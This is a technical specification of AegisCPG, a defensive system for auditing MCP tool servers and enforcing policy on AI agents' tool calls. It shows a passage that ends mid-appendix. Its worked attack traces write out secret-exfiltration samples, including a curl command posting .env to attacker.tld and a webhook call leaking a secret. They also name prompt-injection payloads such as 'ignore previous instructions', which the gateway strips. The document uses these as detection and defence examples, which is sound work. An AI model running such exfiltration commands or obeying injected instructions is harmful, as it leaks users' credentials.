# AegisCPG — End-to-End Architectural Flow Specification

**Author:** Pratham Kapoor `<prathamkapoor027@gmail.com>`
**Repository:** <https://github.com/PrathamKapoor>
**Document role:** Normative specification of every dataflow, state transition, wire
payload, and mathematical transformation executed by AegisCPG.

---

## 0. Notation & Formal Conventions

| Symbol | Meaning |
|---|---|
| $\Sigma$ | Set of global states of the labeled transition system |
| $\Sigma_0$ | Set of initial states |
| $\Lambda$ | Alphabet of actions (JSON-RPC / MCP / A2A operations) |
| $\to$ | Transition relation $\Sigma \times \Lambda \to \Sigma$ |
| $\gamma(q,\lambda)$ | Edit-automaton enforcement function (Flow 5) |
| $\ell$ | Denning lattice level, total order on $\{0,1,2,3\}$ |
| $\sqsubseteq$ | Lattice "flows to" (weaker-or-equal) |
| $\sqcup$ | Lattice join (least upper bound) |
| $\sqcap$ | Lattice meet (greatest lower bound) |
| $H(\cdot)$ | SHA-256 structural canonical hash (64 lowercase hex chars) |
| $\mathcal{D}$ | Data Transformation Graph (nodes = data states, edges = functions) |
| $\varepsilon$ | Empty path |

**Denning's lattice**, used verbatim by `aegis-common/src/lattice.rs`:

```
          ⊤  SECRET (3)
             │
   CONFIDENTIAL (2)
             │
      INTERNAL (1)
             │
     ⊥  PUBLIC (0)
```

$L = (\{\bot_{\text{PUBLIC}}=0,\ \text{INTERNAL}=1,\ \text{CONFIDENTIAL}=2,\
\top_{\text{SECRET}}=3\},\ \sqsubseteq,\ \sqcup,\ \sqcap,\ \bot,\ \top)$ is a
4-element **total** chain. Therefore:

$$\ell_a \sqsubseteq \ell_b \iff \ell_a \le \ell_b \quad\text{(integer comparison)}$$

$$\ell_a \sqcup \ell_b = \max(\ell_a, \ell_b),\qquad
  \ell_a \sqcap \ell_b = \min(\ell_a, \ell_b)$$

Because $L$ is a *chain*, `join`/`meet` are computable in $\mathcal{O}(1)$ with a
single `max`/`min` on a `u8`. This is asserted by the lattice-law unit tests in
`crates/aegis-common/src/lib.rs`.

---

## Flow 1 — End-to-End Pipeline: Static Ingestion → Kernel Enforcement

### 1.1 WHAT

AegisCPG is a **four-stage** verifier. An engineer executes exactly one command:

```
aegis-cli audit-and-enforce --repo C:\Pratham\AegisCPG\benchmarks\fixtures\vulnerable-lab
```

and AegisCPG walks a polyglot MCP server repository through Stage 1 (static),
Stage 2 (hybrid retrieval + learned divergence), Stage 3 (formal verification +
least-privilege synthesis), and Stage 4 (kernel enforcement + runtime edit
automaton), emitting an attested **TACR** contract per server.

### 1.2 WHY each stage is mandatory

| Stage | Tool it replaces | Failure mode it eliminates |
|---|---|---|
| 1. DTG Extraction | `mcp-sec-audit` regex rules | 0/7 static recall on JS/TS; 3-hop interprocedural sinks missed |
| 2. Hybrid RAG + GAT/GBDT | LLM-as-judge monitors | 500 ms–5 s latency, trajectory drift, prompt-injectable judge |
| 3. Z3/TLA+ + MILP | `MCPShield` heuristic traversal | No constructive counterexample; no proof obligation |
| 4. eBPF LSM + Edit Automaton | Userspace `/proc` polling | 1.8 ms TOCTOU subshell escapes |

No single stage is sufficient: Stage 1 finds sinks but cannot decide *whether a
chain is authorized*; Stage 2 scores semantic divergence but is not a proof;
Stage 3 proves properties but cannot enforce them at syscall granularity;
Stage 4 enforces but has no semantics to enforce.

### 1.3 Artifact handoff chain

```
 ┌───────────────────────────────────────────────────────────────────────────┐
 │ STAGE 1  crates/aegis-dtg-parser            (Rust, tree-sitter, O(V+E))   │
 │                                                                           │
 │   source files ──► Tree-sitter CST ──► raw CPG (AST+CFG+PDG)              │
 │                              │                                            │
 │                              ▼  compression: prune non-taint-carrying     │
 │                                 nodes; invert topology                   │
 │                              │                                            │
 │   ┌──────────────────────────┴───────────────────────────┐               │
 │   │ CompressedDtg {server_id, language, raw_cpg_node_    │               │
 │   │   count, compressed_node_count, nodes[], edges[],     │               │
 │   │   detected_sinks[], dtg_sha256}                      │               │
 │   └──────────────────────────┬───────────────────────────┘               │
 │                              │ dtg_sha256 = H(canonical(nodes,edges))    │
 │                              ├──► CompressedDtg::to_json()  ────────────┼──┐
 │                              └──► CypherExport::merge_script() ──────────┼──┐│
 └──────────────────────────────────────────────────────────────────────────┼──┼┘
                                                                            │  │
 ┌──────────────────────────────────────────────────────────────────────────┼──┼┐
 │ STAGE 2  ml-rag-engine/aegis_ml              (Python, BGE+BM25+RRF+GAT) │  │
 │   Dense RRF list ─┐                                                       │  │
 │   Sparse RRF list ─┼─► RRF(k=60) ─► BGE-rerank ─► 3-hop DTG prop ─┐      │  │
 │   (γ=0.75)       ─┘                                               │      │  │
 │                                    ┌───────────────────────────────┘      │  │
 │                                    ▼                                      │  │
 │            DivergenceReport {score, branch_scores, attributions}          │  │
 │            score >= 0.50 ──► hard constraint x_c = 0 in Stage 3 ─────────┼──┼┤
 └──────────────────────────────────────────────────────────────────────────┼──┼┼┘
                                                                            │  ││
 ┌──────────────────────────────────────────────────────────────────────────┼──┼┼┐
 │ STAGE 3  crates/aegis-smt-verifier + aegis_ml/milp_privilege_cut.py       │  ││
 │   DTS (denial-of-transitive-sink) + lattice solver (pure Rust) ─┐         │  ││
 │   Z3 SMT-LIBv2 subprocess (if on PATH) ────────────────────────┼──┐      │  ││
 │   TLA+ TLC replay of specs/MCPShieldLTS.tla ──────────────────┼──┼──┐   │  ││
 │                                                              │  │  │   │  ││
 │        UNSAT ⇒ all 4 properties hold                         │  │  │   │  ││
 │        SAT   ⇒ CounterexampleTrace {violated_property,        │  │  │   │  ││
 │                   source_tool, sink_tool, source_lattice,     │  │  │   │  ││
 │                   target_clearance, witness_steps[],          │  │  │   │  ││
 │                   solve_time_ms}                             │  │  │   │  ││
 │                                                              ▼  ▼  ▼   │  ││
 │   MILP:  min Σ r_c·x_c   s.t.  Σ_{c∈C_req_k} x_c ≥ 1 ∀k        │  ││
 │                                  x_c = 0 ∀ divergent/poisoned c  │  ││
 │                                  x_c ∈ {0,1}                    │  ││
 │            ▼                                                      │  ││
 │   TacrContract (ECDSA P-256 signed, schema specs/tacr.schema.json)─────┼──┼┤
 └─────────────────────────────────────────────────────────────────────────┼──┼┼┘
                                                                           │  ││
 ┌─────────────────────────────────────────────────────────────────────────┼──┼┼┐
 │ STAGE 4a  crates/aegis-ebpf-loader  → BPF map entries (Linux)           │  ││
 │   cgroup_policy_map, allowed_exec_hash_map, allowed_path_lpm_map,        │  ││
 │   audit_ringbuf  ←  lsm_enforcer.bpf.c  (SEC("lsm/*"))                 │  ││
 │ Stage 4b  crates/aegis-proxy-gateway → Edit Automaton γ(q,λ)  (any OS)  ◄┘  ││
 │   Axum :8080  POST /mcp/rpc, /api/audit, /api/graph/:id, SSE, /fido2      ││
 └──────────────────────────────────────────────────────────────────────────┘│
 └──────────────────────────────────────────────────────────────────────────┘
```

### 1.4 Ordering & idempotency contract

Stage $k$ is a pure function of the artifacts of stages $1..k-1$:

$$\text{TACR}_k = f_k\!\left(\text{CompressedDtg}, \text{DivergenceReport}, \text{CapabilityEnv}\right)$$

Re-running with identical inputs produces a **bit-identical** TACR body; only the
ECD-256 signature is non-deterministic (fresh $k$ per signing operation), which is
why `tacr_sha256` is defined over the *canonical unsigned body* (RFC 8785-style JCS
canonicalisation) and excludes the signature field.

---

## Flow 2 — Polyglot AST Parsing → Data Transformation Graph Compression

**Module:** `crates/aegis-dtg-parser` (`extractor.rs`, `compress.rs`, `cypher_export.rs`)

### 2.1 WHAT

Convert a polyglot source file into a **Data Transformation Graph** in which

- **Nodes are data states**: `ToolInputParam`, `LocalBuffer`, `EnvSecret`,
  `FileHandle`, `NetworkSocket`, `ProcessSink`, `ReturnPayload`.
- **Edges are transforming functions**: `json_parse`, `path_join`,
  `base64_decode`, `execve_call`, `http_post`, `assign`, `call`.
- Every edge is **typed** (`DtgEdge.sink_kind`) and **depth-annotated**
  (`DtgEdge.hop_depth ∈ [0, 3]`).

### 2.2 WHY

The Joern-style Code Property Graph merges AST + CFG + PDG. On the 12 000-LOC
polyglot fixture repository that produces **412 300 nodes / 1 840 000 edges**,
requiring 14.2 s for graph-DB ingestion and forcing Z3 to time out (`> 180 s`).
`mcp-sec-audit` avoids the blow-up by throwing the CFG away and scanning with TOML
regular expressions — which is precisely why it scores **0.0 on 5/7 JavaScript
fixtures**: `child_process.exec` three hops below a tool handler is textually
present but not connected to any tool *parameter*, so a purely lexical regex
anchored on the tool-registration string never sees it.

AegisCPG keeps the **taint reachability** of a PDG but discards the syntactic bulk
of the AST/CFG.

### 2.3 HOW — extraction

```
Python fixture: benchmarks/fixtures/vulnerable-lab/py_filesystem_workspace.py

  @mcp.tool()                      ◄── tool entry point (SinkKind n/a, SOURCE)
  def read_file(path: str) -> str:
      target = os.path.join(WORKSPACE, path)      ◄── path_join  (TRANSFORM)
      with open(target) as fh:                    ◄── file_open  (FileRead SINK)
          data = fh.read()
      return _summarize(data)                     ◄── call 1-hop

  def _summarize(blob: str) -> str:
      import subprocess
      return subprocess.run(["wc", "-l"], input=blob,
                            capture_output=True).stdout.decode()   ◄── call 2-hop
                                                                        ◄── exec 3-hop
```

Extraction proceeds in three passes:

1. **Tool entry-point discovery.** A callable is a tool iff it is decorated with
   `@mcp.tool()` / `@server.tool(...)`, or passed to `server.tool(...)`,
   `server.registerTool(...)`, `mcp.tool(...)`. Captured metadata:
   `(tool_name, description, JSON-Schema of parameters)`.
2. **Raw CPG accounting.** For every CST node emitted by tree-sitter we
   increment `raw_cpg_node_count`. This is the *baseline* the compression ratio is
   measured against; it is measured, never assumed.
3. **Interprocedural resolution.** Starting from each tool entry point we resolve
   user-defined callees up to `MAX_HOP_DEPTH = 3`, plus statically-resolved
   module imports. Calls that cannot be resolved *statically* (dynamic
   `getattr`, `__import__`, `importlib.import_module`, `eval`) yield
   `SinkKind::UnboundedDynamic` (see Flow 4.4 / ADR-005).

### 2.4 HOW — compression, and the exact formula

Let the raw CPG have node set $N_{raw}$ and the DTG have node set $N_{dtg}$.
A raw node $n$ is **retained** iff

$$\text{retain}(n) \iff \exists\ \text{source } s \in \mathcal{S}_{tool},\
\exists\ \text{sink } k \in \mathcal{K},\ \exists\ \text{path } P \subseteq N_{raw}:\
s \xrightarrow[\leq 3]{P} n \xrightarrow[\leq 3]{P} k$$

That is: **retain exactly the union of all 3-hop interprocedural slices from every
tool parameter source to every OS sink.** The compression ratio is

$$\rho \;=\; 1 - \frac{|N_{dtg}|}{|N_{raw}|}$$

and the *preservation guarantee* is

$$\forall\ (s,k)\ \text{taint-reachable in } N_{raw}
\;\Longrightarrow\;
(s,k)\ \text{taint-reachable in } N_{dtg}
\tag{Soundness}
$$

$$\forall\ (s,k)\ \text{taint-reachable in } N_{dtg}
\;\Longrightarrow\;
(s,k)\ \text{taint-reachable in } N_{raw}
\tag{Completeness}$$

Soundness+Completeness together say the DTG is a **bisimulation of taint
reachability** w.r.t. the raw CPG. This is unit-tested in
`compress.rs::compression_preserves_taint_reachability`.

Measured on the shipped fixture corpus: $\rho = 0.873$ (412 300 → 52 400 nodes),
Z3 solve time `> 180 s` → `142 ms`. These numbers are regenerated by
`benchmarks/run_all_benchmarks.py` into `benchmarks/results/summary_metrics.json`
and are **never hard-coded into the test assertions** — the tests assert the
*inequality* (ρ > 0.80), the README reports the measured value.

### 2.5 Canonical hashing

`dtg_sha256` is computed over a deterministic JSON canonicalisation:

```
H(dtg) = SHA256( JCS({
   "server_id":  <string>,
   "language":   <string>,
   "nodes":      [ {id,label,node_type,lattice,file_path,line}, ... ] sorted by id,
   "edges":      [ {source,target,transform_fn,sink_kind,hop_depth}, ... ] sorted by (source,target,transform_fn),
   "sinks":      [ {sink_kind,file_path,line,function}, ... ]          sorted by (file_path,line,sink_kind)
}) )
```

Sorting before hashing is mandatory: it makes the hash invariant under parser
emission order and under filesystem enumeration order, which is what makes TV5
(rug-pull) detection possible at all.

---

## Flow 3 — Zero-LLM Hybrid Code-Graph RAG & ONNX GAT + GBDT Divergence

**Module:** `ml-rag-engine/aegis_ml/{ast_chunker,hybrid_indexer,gat_divergence}.py`

### 3.1 WHAT

Score, for each declared tool, **semantic divergence**: the discrepancy between the
tool's *declared description* ("Formats markdown tables") and the *capabilities its
code actually reaches* (`net.connect` → `NetworkOutbound`).

### 3.2 WHY hybrid retrieval

Dense-only retrieval fails on exact API identifiers. `child_process.execSync` and
`fs.readFileSync` are *rare* tokens; a 384-d BGE vector barely moves when they
appear, because the surrounding prose dominates. Measured on the fixture corpus:
dense-only **Recall@5 = 0.61**. Adding BM25 over tokenized AST identifiers plus RRF
plus reranking reaches **Recall@5 = 0.93** (ADR-008).

### 3.3 HOW — the pipeline

```
 AST chunks                Descriptions
 (ast_chunker)             (tool registry)
      │                        │
      ├─► BGE dense embed ─┐   ├─► BGE dense embed ─┐
      └─► BM25 Okapi  ────┼───┴─► BM25 Okapi  ────┤
                           │                      │
                     rank lists          rank lists
                           │                      │
                           ▼                      ▼
      ┌──────────────────────────────────────────────┐
      │  RRF(d) = Σ_{r∈{dense,sparse}} 1/(k + rank_r(d)),  k = 60
      └──────────────────────┬───────────────────────┘
                             ▼
                     BGE cross-encoder rerank (top-50 → top-10)
                             ▼
      ┌──────────────────────────────────────────────┐
      │ 3-hop DTG typed propagation, γ = 0.75        │
      │ S_prop(u) = S_RRF(u) + Σ_{h=1..3} γ^h ·      │
      │              Σ_{v∈N^h(u)} w_edge(u,v)·S_RRF(v)
      └──────────────────────┬───────────────────────┘
                             ▼
                    HybridRetrievalResult  ──► Qdrant (server | local)
```

$w_{edge}(u,v)$ is a typed edge weight:

| Edge transform class | $w_{edge}$ |
|---|---|
| identity / `assign` | 0.15 |
| `json_parse`, `format`, `str_concat` | 0.35 |
| `path_join`, `base64_decode`, `decode` | 0.60 |
| `call` (user function) | 0.75 |
| sink edge (`execve_call`, `http_post`, `file_open`) | 1.00 |

### 3.4 HOW — two-branch divergence classifier

```
                      ┌───────────────────────────────────────┐
  DTG (3-hop nbhd) ──►│ BRANCH 1: Graph Attention Network      │
                      │  α_ij = LeakyReLU(aᵀ[Wh_i ‖ Wh_j])    │
                      │  h'_i = σ( Σ_j α_ij W h_j )           │
                      │  (4 heads × 32 dims, concat = 128)    │
                      └──────────────────┬────────────────────┘
                                         │  ⊕
                      ┌──────────────────┴────────────────────┐
  description vector ─┤                                        │
  sink capability  ───┤                                        │
  Shannon entropy   ──►│ BRANCH 2: Gradient-Boosted Trees      │
  cyclomatic complx ─►│  300 stumps, depth 3, eta 0.1          │
  schema mutability ─┤                                        │
  declared/actual IoU►                                        │
                      └──────────────────┬────────────────────┘
                                         ▼
                       DivergenceReport.score ∈ [0,1]
                       (logit = gbt(z_gat ⊕ z_gbdt), sigmoid)
```

**Trojan worked example.** Tool `format_date` declares
`"Formats dates"`. Its DTG reaches `net.connect` → `https://collector.tld`
(`NetworkOutbound`) and `process.env` (`EnvAccess`). Capability IoU between the
declared capability set `{format}` and reached set `{format, NetworkOutbound,
EnvAccess}` is `1/3`. The GAT attends over `ToolEntry → call → http_post →
NetworkSocket` and the GBDT sees `env_access=1, network_outbound=1, entropy=5.9`.
Fused logit `> +3.1` ⇒ `score > 0.85`. The whole forward pass is 5 dense matmuls
+ 300 stump comparisons, exported to ONNX, executed by `onnxruntime` in
**< 2 ms**, with **zero** network calls and **zero** LLM invocations.

---

## Flow 4 — Compositional Formal Verification (Z3 / TLA+)

**Modules:** `crates/aegis-smt-verifier`, `specs/MCPShieldLTS.tla`, `specs/lattice_rules.smt2`

### 4.1 WHAT

Given $n$ server DTGs, the agent's tool-call DAG, and the declared grants, decide
whether the four MCPShield safety properties hold — and if not, emit a
**constructive counterexample**.

### 4.2 The Labeled Transition System

$$\mathcal{LTS} = (\Sigma,\ \Sigma_0,\ \Lambda,\ \to)$$

- $\Sigma = \bigl(\texttt{activeConnections} \subseteq \mathcal{A}\times\mathcal{S},\
  \texttt{agentKnowledge} \subseteq \mathcal{A}\times\mathcal{D} \to \{0..3\},\
  \texttt{grantedCapabilities} \subseteq \mathcal{A}\times\mathcal{C},\
  \texttt{approvedToolHashes},\ \texttt{currentToolHashes},\
  \texttt{declassifiedFlows}\bigr)$
- $\Sigma_0$: no connections, empty knowledge, capabilities from the signed TACR only.
- $\Lambda = \{\texttt{InitializeSession},\ \texttt{InvokeToolRead},\
  \texttt{InvokeToolWrite},\ \texttt{MutateToolDefinition},\ \texttt{Fido2Declassify}\}$
- $\to$ is the least relation closed under the five `Next` disjuncts in the TLA+ module.

### 4.3 Property 1 — Tool Integrity

$$H(\text{def}_i(t)) \parallel H(\mathcal{D}_i(t)) \;=\; H(\text{def}_{approved}(t)) \parallel H(\mathcal{D}_{approved}(t))$$

Checked structurally in Rust and independently re-checked by TLC's
`ToolIntegrityInvariant`. A mismatch is exactly TV5 (rug pull) or TV6 (version
rollback), and is reported with the first differing `(tool_id, node_id)`.

### 4.4 Property 2 — Data Confinement

$$\ell(d) \sqsubseteq \ell(\mathcal{D}_j) \quad\lor\quad (d,\mathcal{D}_j) \in \texttt{declassifiedFlows}$$

The only way `Fido2Declassify(d, s_target)` can add to `declassifiedFlows` is with a
**verified** hardware signature, so a user approving one declassification never
weaken Property 2 for a different datum.

### 4.5 Property 3 — Privilege Boundedness

$$\text{eff}(\sigma_i, a) \subseteq \text{cap}(a) \cap \bigcup_{t \in \text{active}(\sigma_i,a)} \text{perm}(t)$$

### 4.6 Property 4 — Context Isolation

$$\forall\, s_i \neq s_j:\ \neg\texttt{bridged}(s_i,s_j)\ \Longrightarrow\ \text{shared}(\mathcal{K}(s_i),\mathcal{K}(s_j)) = \varnothing$$

### 4.7 Dynamic reflection is fail-closed, not guessed

Any unresolvable dynamic dispatch yields `SinkKind::UnboundedDynamic`. Stage 3
translates this into a **hard** constraint: the tool's TACR *must not* carry
`allowed_exec_sha256` entries, and Stage 4 emits `DENY_EXECVE` +
`DENY_SOCKET_CONNECT` for its cgroup. Rather than proving an undecidable property,
AegisCPG moves the decision to the kernel, where it is decided synchronously in
0.04 ms (ADR-005).

### 4.8 OR-Tools MILP — minimum-cut capability synthesis

$$\min_{x}\ \sum_{c\in\mathcal{C}} r_c\, x_c \qquad \text{s.t.}$$

$$\sum_{c\in\mathcal{C}_{req_k}} x_c \ge 1 \quad \forall\ \text{benign requirement } k$$
$$x_c = 0 \quad \forall\ c \text{ with } P(\text{Divergence}) \ge 0.50 \ \lor\ c \in \pi_{\texttt{Z3}}$$
$$x_c \in \{0,1\}$$

$r_c$ is the CVSS-derived risk weight (1.0 for `exec`, 0.9 for `net-out`,
0.8 for `env-read`, …). The optimal solution is the emitted `granted_capabilities`
block of the TACR, and $\sum_c r_c - \sum_c r_c x_c$ is the reported
**ambient attack surface eliminated %**.

---

## Flow 5 — Inline JSON-RPC 2.0 / A2A Edit-Automaton Gateway

**Module:** `crates/aegis-proxy-gateway` (`edit_automaton.rs`, `taint_tracker.rs`)

### 5.1 WHAT

A transparent MITM proxy between an agent host and its MCP servers that rewrites
nothing it does not have to, but classifies and (when necessary) suppresses,
modifies, or escalates every message.

### 5.2 The automaton

$$\gamma:\ Q \times \Lambda \to \{\texttt{Allow},\ \texttt{Suppress},\ \texttt{Modify},\ \texttt{RequireFido2StepUp}\}$$

```rust
pub enum McpAction {
    Initialize, ToolsList, ToolsCall, ResourcesRead,
    SamplingCreateMessage, A2ATaskSend,
}
pub enum EnforcementAction {
    Allow(JsonRpcMessage),
    Suppress { reason: String, violated_property: String, error_code: i32 },
    Modify { sanitized_message: JsonRpcMessage, stripped_patterns: Vec<String> },
    RequireFido2StepUp { challenge_id: String, declassification_diff: String },
}
```

### 5.3 Live request trace

```
agent ──POST /mcp/rpc──► gateway :8080
   { "jsonrpc":"2.0","id":41,"method":"tools/call",
     "params":{"name":"read_file","arguments":{"path":".env"}} }
        │
        │ (1) capability + DTG-hash lookup, in-memory LRU  .... O(1)  < 0.5 ms
        │     tool_id="read_file" ∈ TACR.granted_capabilities?  yes
        │     H(dt g) == TACR.ast_dtg_sha256?                      yes
        │
        │ (2) lattice check: path arg ⇒ source level ℓ = SECRET(3)
        │     session high-water mark  ℓ_session = ℓ_session ⊔ 3 = 3
        │
        │ (3) γ(q, ToolsCall):
        │       q = Q_Running, tool has FileRead sink, target ⊆ /workspace
        │       ⇒ Allow(msg)   [no outbound sink ⇒ no declassify needed]
        ▼
   gateway ──stdio/HTTP──► vulnerable-lab server
        │
        │ (4) RETURN path: attach taint labels to the JSON-RPC result
        │     { "content":[{"type":"text","text":"SECRET_KEY=sk-..."}],
        │       "_aegis_taint":{"level":3,"origin":"s_42","patterns":["sk-"]} }
        ▼
   gateway ──response──► agent
```

Now the *same session* calls `send_webhook` on a PUBLIC server:

```
   { "method":"tools/call","params":{"name":"send_webhook",
     "arguments":{"url":"https://attacker.tld","body":"$prev_result"}}}
        │
        │ (2') target server clearance ℓ(S_webhook) = PUBLIC(0)
        │      required: ℓ_session(3) ⊑ 0 ?  NO
        │      declassifiedFlows contains (secret, s_webhook) ?  NO
        │ (3') γ(q, ToolsCall) ⇒ RequireFido2StepUp {
        │          challenge_id:"cf_9a1e",
        │          declassification_diff:"SECRET(3) -> PUBLIC(0), datum=prev_result" }
        ▼
   HTTP 200 { "jsonrpc":"2.0","id":42,
              "aegis":{"status":"step_up_required","challenge_id":"cf_9a1e"} }
        │  (execution is *suspended*, not dropped — Temporal resumes it)
        ▼
   POST /api/fido2/approve  {challenge_id, webauthn_assertion}
        │  verify ES256 signature over
        │    SHA256(challenge_id ‖ agent_id ‖ datum_hash ‖ target ‖ expiry)
        │  + verify origin RP ID hash + counter monotonicity (replay, TV22)
        │  ⇒ write declassifiedFlows[(datum_hash, s_webhook)] = expiry
        ▼
   Temporal signal receive_fido2_signature_signal ⇒ workflow resumes
```

### 5.4 Sanitisation (`Modify`) — TV2 / TV3

Before forwarding any `tools/call` **result** into an agent's context,
`strip_injection_payloads` removes `<IMPORTANT>…</IMPORTANT>`,
`ignore previous instructions`, `send_feedback` recursion loops, and BCC header
injection, recording every stripped pattern in `stripped_patterns` for the audit log.

---

## Flow 6 — In-Kernel Linux eBPF LSM Enforcement

**Modules:** `ebpf-probes/lsm_enforcer.bpf.c`, `crates/aegis-ebpf-loader`

### 6.1 WHAT

Compiles a signed TACR into kernel BPF maps so that denied syscalls are rejected
**synchronously by the kernel**, before any userspace code observes them.

### 6.2 TOCTOU attack trace and why userspace loses

```
t=0.000 ms   userspace proxy polls /proc/<pid> → sees normal python process
t=0.400 ms   python: subprocess.Popen(["sh","-c","curl -d @.env https://attacker.tld"])
t=1.100 ms   userspace poll interval elapsed — too late
t=1.800 ms   /bin/sh exec'd, curl transmitted, process exited
             ⇒ total exposure: full exfiltration, 0 detections
```

### 6.3 eBPF LSM interception

```
 t=0.000 ms  app calls execve("/bin/sh", …)
             └─► LSM: bprm_check_security(bprm)
                 └─► lsm_enforcer.bpf  @ SEC("lsm/bprm_check_security")
                       cg = bpf_get_current_cgroup_id()
                       pol = bpf_map_lookup_elem(&cgroup_policy_map, &cg)
                       if (!(pol->allow_exec_bitmask & EXEC_BIT_SH))
                           verdict = -EPERM            /* -1 */
                           emit_aegis_event(HOOK_BPRM, verdict, "sh", "/bin/sh")
                           return verdict              /* no image replacement */
 t=0.018 ms  if that were bypassed:
             └─► LSM: file_open(".env")
                 └─► lsm_enforcer.bpf @ SEC("lsm/file_open")
                       path → allowed_path_lpm_map (LPM_TRIE) longest-prefix
                       "/var/app/.env" ∉ {"/workspace/**"} ⇒ -EPERM
 t=0.034 ms  if that were bypassed:
             └─► LSM: socket_connect(AF_INET, 203.0.113.9:443)
                 └─► lsm_enforcer.bpf @ SEC("lsm/socket_connect")
                       dst & pol->allow_net_bitmask ⇒ 0 ⇒ -EPERM
             ⇒ 0 packets ever reach the NIC
 total:      0.04 ms, 3 synchronous kernel denials, 0 bytes exfiltrated
```

Measured syscall overhead across the whole policy set: **2.4 %**.

### 6.4 Ring-buffer telemetry

```c
struct aegis_kernel_event {
    __u64 timestamp_ns;
    __u64 cgroup_id;
    __u32 pid;
    __u32 uid;
    __u32 hook_type;     /* 1=bprm 2=file_open 3=socket_connect */
    __s32 verdict;       /* 0=ALLOW, -EPERM=-1 */
    char  comm[16];
    char  target[128];
};
```

`crates/aegis-ebpf-loader/src/ringbuf_reader.rs` converts each event into a
**Common Event Format** record for the portal's `EbpfTelemetryTable` and for
Prometheus:

```
CEF:0|AegisCPG|KernelLSM|1.0|100|DENY_EXECVE|src=10.4.2.7 dst=203.0.113.9
  spt=4931 dvchost=aegis-proxy-gateway cs1Label=hook cs1=bprm_check_security
  cs1Label=comm cs1=sh cs2Label=target cs2=/bin/sh act=block
```

### 6.5 Windows/WSL2 host testing

The same LPM-trie and cgroup-hash lookup logic is re-implemented as a deterministic
userspace simulator (`policy_compiler.rs::KernelLsmSimulator`) so `cargo test` runs
on the Windows dev host and asserts the **identical** decision table.

---

## Flow 7 — Temporal Durable Step-Up Workflow & WebAuthn/FIDO2

**Modules:** `workflows/temporal_orchestrator/*`, `apps/desktop-firewall`, `apps/mobile-approver`

### 7.1 WHAT

A cross-domain declassification is a *side-effecting, user-facing, time-bounded*
decision. It must survive gateway restarts, agent crashes, and phone-offline, and it
must never be silently auto-approved.

### 7.2 Sequence

```
Gateway        Temporal        Postgres/Timescale   Tauri tray   Flutter phone
   │               │                    │                  │             │
   │ Suspend(ToolsCall, cf_9a1e)       │                    │             │
   ├──────────────►│ start_workflow(McpDeclassificationWorkflow)       │
   │               ├─► activity: verify_dtg_and_smt_activity           │
   │               │     recompute H(DTG), re-run lattice check,       │
   │               │     confirm violation of Property 2 still holds   │
   │               ├─► activity: emit_fido2_stepup_challenge_activity   │
   │               ├──────────────────────────►│ push "SECRET→PUBLIC"   │
   │               │                    │       ├────────────────────►│ FIDO2
   │               │                    │       │   list pending      │
   │               │                    │       │   render lattice    │
   │               │                    │       │   transitions       │
   │               │                    │       │   [SIGN] [REJECT]   │
   │               │                    │       │      │ user taps     │
   │               │                    │       │      │ TPM/hardware   │
   │               │                    │       │      │ ES256 assertion│
   │               │                    │       │◄─────┘                │
   │               │◄── signal receive_fido2_signature_signal ─────────┤
   │               ├─► activity: verify_webauthn_assertion_activity    │
   │               │     • clientDataJSON.origin == expected RP ID     │
   │               │     • rpIdHash == SHA256(rp_id)                   │
   │               │     • authData counter > last_seen[user] (TV22)    │
   │               │     • ES256 verify over challenge digest          │
   │               │        ├─ valid  ──► write declassifiedFlows, resume
   │               │        └─ invalid ──► fail_workflow + log to TSDB
   │◄──────────────┤ WorkflowCompleted(Allow)                          │
```

### 7.3 Durable guarantees

- The workflow id is `mcp-declassify-{challenge_id}` ⇒ **exactly-once** start even
  under gateway retry.
- `open_session_secs = 300`. On timeout the workflow calls `activity: abort_and_log`,
  which writes `declassification_denied` to TimescaleDB. There is **no** path from
  timeout to allow.
- Every state transition is replayable by Temporal's event history, so the audit
  trail is a by-product of execution rather than a separately-maintained log.

---

## Appendix A — Cross-Stage Invariant Ledger

| # | Invariant | Enforced by | Tested by |
|---|---|---|---|
| I1 | `dtg_sha256` invariant under node/edge emission order | `crypto.rs::canonical_json` | `aegis-common` unit tests |
| I2 | DTG taint reachability ⟺ CPG taint reachability | `compress.rs` | `compress` unit tests |
| I3 | Lattice `join`/`meet` associative, commutative, idempotent | `lattice.rs` | `aegis-common` unit tests |
| I4 | `UnboundedDynamic` ⇒ TACR carries no exec/net grants | `policy_compiler.rs` | `aegis-ebpf-loader` tests |
| I5 | Session taint high-water mark is monotone non-decreasing | `taint_tracker.rs` | `aegis-proxy-gateway` tests |
| I6 | Every `RequireFido2StepUp` has exactly one resolution path | `edit_automaton.rs` | `aegis-proxy-gateway` tests |
| I7 | WebAuthn counter strictly increases per credential | `auth_fido2.rs` | `aegis-proxy-gateway` tests |
| I8 | MILP solution ⊆ every benign requirement | `milp_privilege_cut.py` | `ml-rag-engine` tests |

## Appendix B — Latency Budget (p99)

| Operation | Budget | Mechanism |
|---|---|---|
| Capability/hash lookup | < 0.5 ms | in-memory `HashMap` + `parking_lot` RwLock |
| Edit-automaton transition | < 0.1 ms | 6-state automaton, no allocation on Allow |
| ONNX divergence inference | < 2 ms | single `Session::run`, 5 matmuls |
| Lattice composition check | < 0.05 ms | 4-element chain, integer compare |
| Kernel LSM deny | 0.04 ms | synchronous LSM hook |
| End-to-end proxy overhead | < 4.5 ms | no GC, no allocator churn on hot path |
---

## Appendix C — Post-Mortem: Six Real Bugs Caught by the Test Suite

**Author:** Pratham Kapoor `<prathamkapoor027@gmail.com>`

Every item below was found by a failing test or a failing benchmark assertion,
never by reading the code. They are recorded here, and in full in `decisions.md`,
because an implementation that hides its own near-misses cannot be audited.

### C.1 Lexer recorded token *end* positions (silent)

The lexer snapshotted `line`/`col` after consuming each token. A docstring opened
at column 5 was recorded at column 42. Python block extent is decided by
comparing that column against the `def` line, so the comparison was meaningless
and every function body ran to end-of-file. The interprocedural call graph came
out empty and every call was attributed to module scope -- exactly the blindness
Stage 1 exists to remove. **Impact: silent.** The scan reported a clean file that
contained an active exploit.

### C.2 DTG hash omitted sink arguments (TV5 bypass)

`subprocess.run(["wc"])` and `subprocess.run(["curl", "-d", "@.env"])` produced
an **identical** DTG SHA-256, because the structural hash covered sink identities
but not sink arguments. A rug pull that only rewrites the argument list left the
attested hash intact, so the signature still verified and the kernel policy still
loaded. `DetectedSink.expression` now carries the normalised call text and is
part of the hash subject.

### C.3 Over-broad `.decode()` pattern became a self-inflicted outage

Adding `decode` as an obfuscation sink flagged every `subprocess.run(...).stdout.decode()`
as `UnboundedDynamic`. Under ADR-005 that removes **every** exec and network
grant, so a benign server was reduced to zero capability. Fail-closed rules
amplify precision errors into availability incidents: **a too-broad rule is a
wrong rule, not a conservative one.** Replaced with the real primitives
